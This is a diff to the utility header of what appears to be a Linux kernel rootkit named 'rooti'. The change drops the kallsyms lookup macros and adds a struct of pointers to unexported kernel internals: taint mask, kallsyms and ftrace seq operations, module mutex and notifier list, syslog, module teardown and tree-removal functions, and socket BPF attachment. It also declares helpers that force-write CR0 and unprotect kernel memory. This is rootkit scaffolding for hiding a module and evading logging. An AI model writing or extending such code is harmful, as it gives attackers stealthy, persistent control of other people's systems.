@@ -2,6 +2,12 @@
 #define _ROOTI_UTILS_H
 
 #include <linux/printk.h>
+#include <linux/mutex_types.h>
+#include <linux/notifier.h>
+#include <linux/seq_file.h>
+#include <linux/bpf.h>
+#include <linux/module.h>
+#include <net/sock.h>
 #include "config.h"
 
 #ifdef ROOTI_DEBUG_LOGGING
@@ -18,27 +24,6 @@
 #endif
 
 /*
-    This macro declares a local pointer to a kernel symbol named 'symbol' whose address
-    is resolved by using kallsyms_lookup_name(). The generated symbol is the same as 'symbol' with two
-    leading underscores. On error, 'error_value' is returned.
-*/
-#define ROOTI_RESOLVE_SYM_ADDR(type, symbol, error_value)               \
-type __##symbol = (type)__kallsyms_lookup_name(#symbol);                \
-if (__##symbol == NULL) {                                               \
-    ROOTI_DEBUG("unresolved symbol '%s'", #symbol);                     \
-    return error_value;                                                 \
-}
-
-/*
-    Just like the macro above but specifically for function pointers. The function signature is
-    typedef'ed as <symbol>_t and is constructed by: 'return_type' and the following variable number
-    of args which specify the argument types in order.
-*/
-#define ROOTI_RESOLVE_FUNC_ADDR(symbol, error_value, return_type, ...)  \
-typedef return_type (*symbol##_t)(__VA_ARGS__);                         \
-ROOTI_RESOLVE_SYM_ADDR(symbol##_t, symbol, error_value)
-
-/*
     Unfortunately the linux kernel ARRAY_SIZE macro cannot be used to assign the result of the
     calculation to a constant variable because the linux macro includes some magic __must_be_array()
     term to catch invalid use of the macro, thus making the expression not constant.
@@ -46,9 +31,31 @@ ROOTI_RESOLVE_SYM_ADDR(symbol##_t, symbol, error_value)
 #define CONST_ARRAY_SIZE(ARR) sizeof(ARR) / sizeof(ARR[0])
 #define DECLARE_ARRAY_SIZE(ARR) const size_t ARR##_COUNT = CONST_ARRAY_SIZE(ARR)
 
-extern unsigned long (*__kallsyms_lookup_name)(const char *name);
+struct rooti_sym_repo {
+    unsigned long (*kallsyms_lookup_name)(const char *);
 
-int rooti_resolve_kln_addr(void);
+    unsigned long *tainted_mask;
+    struct seq_operations *kallsyms_op;
+    struct seq_operations *show_ftrace_seq_ops;
+    struct mutex *module_mutex;
+    struct blocking_notifier_head *module_notify_list;
+
+    int (*do_syslog)(int, char *, int, int);
+    void (*mod_sysfs_teardown)(struct module *);
+    void (*module_arch_cleanup)(struct module *);
+    void (*module_unload_free)(struct module *);
+    void (*module_destroy_params)(const struct kernel_param *, unsigned);
+    void (*mod_tree_remove)(struct module *);
+    void (*module_bug_cleanup)(struct module *);
+    void (*module_arch_freeing_init)(struct module *);
+   	void (*klp_module_going)(struct module *);
+	void (*ftrace_release_mod)(struct module *);
+	int (*__sk_attach_prog)(struct bpf_prog *, struct sock *);
+};
+
+extern struct rooti_sym_repo rooti_sym_repo;
+
+int rooti_resolve_unexported_syms(void);
 
 inline void rooti_force_write_cr0(unsigned long val);
 inline void rooti_unprotect_memory(void);
